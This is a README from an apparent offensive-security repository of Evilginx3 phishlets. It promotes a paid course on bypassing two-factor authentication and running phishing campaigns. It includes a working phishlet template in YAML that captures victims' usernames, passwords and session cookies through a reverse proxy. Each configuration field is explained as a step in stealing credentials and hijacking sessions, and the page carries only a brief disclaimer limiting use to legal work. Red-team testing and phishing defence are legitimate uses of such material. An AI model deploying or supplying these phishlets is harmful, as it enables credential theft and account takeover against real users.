  ## Updated Evilginx3 Phishlets
I've dedicated substantial time and effort to create and update new phishlets for Evilginx3. In this repository, you'll find many custom Evilginx phishlets, finely crafted and updated to suit real-world applications

**Got any requests or questions?** Feel free to message me @ Simplerhacking.com or message me on Discord

## Join the private Evilginx Discord Server!
![Discord Members](https://img.shields.io/badge/Discord%20Members-1304-blue)

[![Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/TYh7Df37)

# Our New Evilginx Phishing Masterclass Has Been Released!
## Download the course: www.simplerhacking.com/courses/evilginx-course
Learn to bypass 2FA with the latest version of Evilginx3, send verified campaigns, capture credentials, record & analyze campaign results.

### Course Content Preview:

[![Evilcover2](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/d05fe6c1-9fdd-454c-8a96-689a880a8ddf)](https://www.simplerhacking.com/courses/evilginx-course)

![Screenshot (2501)](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/1ae29b71-6d8b-4f28-9a12-edde24ba3060)

![Screenshot (2500)](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/93e2aa6f-4387-41b7-a612-0ac8d0152942)


https://github.com/simplerhacking/Evilginx3-Tutorial/assets/141525149/fa7dcbf0-13cb-4cfc-b7a8-f944d824b0c2

https://github.com/simplerhacking/Evilginx-Course/assets/141525149/3bf788e5-d7df-48fb-9820-00520185cfd7



![SMTP-or-API-Email-Sending Evilginx3 ad](https://github.com/simplerhacking/Evilginx3-Tutorial/assets/141525149/6b5e4061-978f-488a-aa0e-53cb505f1022)


- **Affordable Pricing:** I've made the price of the course afforable for anyone interesting in learning about Evilginx & MITM Attacks.
- **Great for all skill levels:** The course is designed with clear explanations that make even complex topics easy to understand.
- **Practical Application:** Through hands-on labs & real customizeable templates, We help you apply what you learn in real-world scenarios.
- **From Basics to Advanced:** This course offers a smooth learning curve, foundation before diving into advanced features of Evilginx3.
- **Custom Phishlets files & Resources:** Personalized phishlet files, Q&A support & resources bridge the gap between theory & practice


## Need Custom Phishlets? 
Check our constantly updating our free Evilginx3 Phishlet Repository for Red Teams

You can find it here: https://github.com/simplerhacking/Evilginx3-Phishlets

## Questions?
Send us an email to info@simplerhacking.com or message directly on our website www.simplerhacking.com

## Disclaimer
The tools here are intended solely for legal and ethical use by cybersecurity professionals in controlled environments. 
Any illegal or malicious use is strictly prohibited.
I disclaim all responsibility for any harm, loss, or damage that may arise from improper use. 

##

## Simpler Hacking Evilginx Phishlet Template (Use this template to make your own!)

```yaml
name: 'Your First Phishlet'
author: 'Simpler Hacking'
min_ver: '3.2.0'

proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }

sub_filters: 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}

auth_tokens:
  - domain: '{domain}'
    keys: ['session']

creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

auth_urls:
  - url_regex: 'https://{hostname}/login'
    valid_statuses: [200]

login:
  username: user
  password: pass
  url: https://www.{domain}/login

# This is just a demo example of a phishlet for 3.2.0

# You can find phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets

```
**Explanation of Phishlet Parameters:**

- `name:` Identifies the name of the phishlet.
- `author:` Specifies the phishlet author.
- `min_ver:` Specifies the minimum Evilginx version that is compatible with your phishlet.
- `proxy_hosts:` Indicates the domain and subdomains to proxy. The `phish_sub` is the subdomain that the phishing page will imitate.
- `sub_filters:` Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
- `auth_tokens:` Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
- `creds:` This field determines the credentials that the phishlet is engineered to steal. The `key` is the name of the credential (like username or password) and `search` is a regular expression that the program will use to identify and extract these details from the user's input.
- `auth_urls:` Defines the URLs that Evilginx will treat as the authenticated URLs. After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed `auth_tokens`.
- `login:` Here you specify the identifiers of the username and password fields in the login form on the original webpage. The `url` is the link of the page where the victim enters their credentials.
- `force_post:` If set to true, it forces the alteration of HTTP method from GET to POST.
- `is_landing:` If set to true, it means that the page is a landing page for the phishing attack.
- `js_inject:` This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
- `domain:` This is a template variable used to replace target hostname used in phishlet configuration.

## Enroll in our free training lessons & webinars: www.simplerhacking.com/courses/evilginx-webinar




## Disclaimer
The tools here are intended solely for legal and ethical use by cybersecurity professionals in controlled environments. 
Any illegal or malicious use is strictly prohibited.
I disclaim all responsibility for any harm, loss, or damage that may arise from improper use.
